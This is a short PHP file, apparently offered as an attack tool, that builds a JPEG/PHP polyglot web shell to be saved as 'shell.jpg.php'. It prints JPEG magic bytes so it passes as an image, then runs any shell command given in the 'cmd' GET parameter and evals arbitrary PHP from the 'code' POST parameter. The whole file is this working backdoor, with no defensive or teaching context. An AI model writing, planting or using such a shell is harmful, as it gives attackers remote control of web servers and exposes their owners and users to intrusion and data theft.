<?php
// JPEG magic bytes + PHP shell polyglot
// Simpan sebagai shell.jpg.php

// Magic bytes JPEG
echo "\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01";

// PHP shell code
?>
<?php
// Shell starts here (after JPEG header)
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
    die();
}
if(isset($_POST['code'])) {
    eval($_POST['code']);
    die();
}
// Make it look like a valid image
header('Content-Type: image/jpeg');
echo "\xFF\xD9"; // JPEG end marker
?>
